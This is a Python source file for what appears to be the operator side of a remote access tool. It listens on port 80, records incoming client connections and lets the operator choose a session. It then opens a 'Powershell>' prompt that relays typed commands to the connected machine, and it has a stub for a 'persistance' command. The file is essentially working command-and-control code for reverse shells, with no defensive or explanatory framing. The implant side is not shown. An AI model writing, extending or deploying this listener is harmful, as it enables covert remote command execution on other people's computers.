import socket
import sys
import time
from helper import client_call
from threading import Thread

class Server():
    def __init__(self):
        self.clients = []

    def launch(self):
        def listen():
            host, port = ('', 80)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f'Listening on port {port}...')
            s.bind((host,port))
            self.s = s
            while True:
                s.listen(5)
                (client, address) = s.accept()
                print(f'\nConnected: client address => {address[0]}' + "\n>", end = '')
                self.clients.append((client, address))
        self.th = Thread(target=listen)
        self.th.start()

    def access_manager(self):
        def get_device():
            print("Select current session to manage:")
            print(str(len(self.clients)) + " devices. choose one")
            select = input('>')
            return select

        def connect():
            try:
                select = get_device()
                select = int(select)
                self.clients[select][0]
                exist = True
            except KeyboardInterrupt :
                sys.exit(1)
            except:
                exist = False

            if exist:
                self.open_prompt(self.clients[select][0])
            else:
                print('Element must exist...')
                connect()
        connect()

    def open_prompt(self, client):
        print('Terminal open')
        while True:
            try:
                cmd = input('Powershell>')
                if cmd not in ["quit", "persistance"]:
                    client_call(client, cmd)
                elif(cmd == "quit"):
                    self.access_manager()
                    break
                elif(cmd == "persistance"):
                    pass
            except Exception as e:
                print('POKSOS2')
                print('except on run_tcp_server: ', e)
                self.s.close()

def main():
    try:
        server = Server()
        server.launch()
        time.sleep(.1)
        server.access_manager()
    except Exception as e:
        print(e)
        server.s.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
